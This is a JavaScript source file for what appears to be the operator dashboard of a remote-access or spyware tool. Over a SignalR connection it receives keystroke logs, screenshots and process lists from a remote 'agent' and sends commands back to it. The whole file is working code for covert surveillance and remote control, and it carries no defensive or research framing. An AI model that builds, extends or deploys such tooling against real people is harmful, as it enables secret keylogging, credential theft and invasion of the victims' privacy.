const agentId = "Agent1";

const connection = new signalR.HubConnectionBuilder()
    .withUrl("http://localhost:5000/controlHub")
    .withAutomaticReconnect()
    .build();

const processListUl = document.getElementById("processList");
const keyLogUl = document.getElementById("keyLog");
const screenshotImg = document.getElementById("screenshot");

connection.on("ReceiveData", response => {
    if(response.AgentId !== agentId) return;

    switch(response.DataType) {
        case "PROCESS_LIST":
            processListUl.innerHTML = "";
            response.Data.forEach(p => {
                const li = document.createElement("li");
                li.textContent = p;
                processListUl.appendChild(li);
            });
            break;
        case "KEYLOG_CHUNK":
            const li = document.createElement("li");
            li.textContent = response.Data;
            keyLogUl.appendChild(li);
            break;
        case "SCREENSHOT":
            screenshotImg.src = "data:image/png;base64," + response.Data;
            break;
        default:
            console.log("Unknown DataType:", response.DataType);
    }
});

connection.start().then(() => {
    console.log("Connected to backend SignalR Hub");
}).catch(err => console.error(err.toString()));

function sendCommand(command) {
    const commandObj = { Command: command };
    connection.invoke("SendCommandToAgent", agentId, JSON.stringify(commandObj))
        .catch(err => console.error(err.toString()));
}
